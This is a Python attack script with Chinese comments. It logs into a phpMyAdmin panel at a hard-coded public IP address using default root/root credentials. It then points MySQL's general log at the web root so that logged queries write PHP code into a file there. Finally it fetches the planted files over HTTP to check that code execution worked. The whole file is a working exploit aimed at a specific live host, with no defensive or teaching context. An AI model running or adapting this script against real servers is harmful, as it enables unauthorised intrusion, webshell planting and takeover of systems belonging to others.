#!/usr/bin/env python3
"""测 file_put_contents 返回值: 日志里会显示 1=成功 false=失败"""
import urllib.request, http.cookiejar, re, urllib.parse, time

B = "http://81.70.245.25/phpmyadmin/"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]
html = op.open(B, timeout=10).read().decode("utf-8", "ignore")
tok = re.search(r'name="token" value="([a-f0-9]{32})"', html).group(1)
data = f"pma_username=root&pma_password=root&server=1&token={tok}".encode()
op.open(urllib.request.Request(B + "index.php", data=data), timeout=10).read()

def sql(q):
    qq = urllib.parse.urlencode({"token": tok, "sql_query": q, "ajax_request": "true", "db": "mysql"})
    r = op.open(urllib.request.Request(B + "import.php?" + qq, data=b""), timeout=15)
    return r.read().decode("utf-8", "ignore")

# 测试 file_put_contents 返回值
sql("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/tf.php'")
sql("SET GLOBAL general_log = 'ON'")
sql("SELECT '<?php echo var_export(@file_put_contents(\"C:/phpStudy/WWW/zzz2.txt\", \"OK456\"), true);?>'")
sql("SET GLOBAL general_log = 'OFF'")
time.sleep(1)

# 读回看结果
r = sql("SELECT '<?php echo file_get_contents(\"C:/phpStudy/WWW/tf.php\");?>'")
# 直接 HTTP 读 tf.php
import urllib.request as ur
try:
    rr = ur.urlopen(urllib.request.Request("http://81.70.245.25/tf.php", headers={"User-Agent":"Mozilla/5.0"}), timeout=8)
    body = rr.read().decode("utf-8","ignore")
    for line in body.split("\n"):
        if "SELECT" in line and "file_put" not in line:
            print("tf.php 记录:", line.strip()[:150])
except Exception as e:
    print("tf.php ERR:", str(e)[:80])
# 也看 zzz2.txt 是否存在
try:
    rr = ur.urlopen(urllib.request.Request("http://81.70.245.25/zzz2.txt", headers={"User-Agent":"Mozilla/5.0"}), timeout=8)
    print("zzz2.txt HTTP:", rr.status, rr.read()[:50])
except Exception as e:
    print("zzz2.txt:", str(e)[:60])
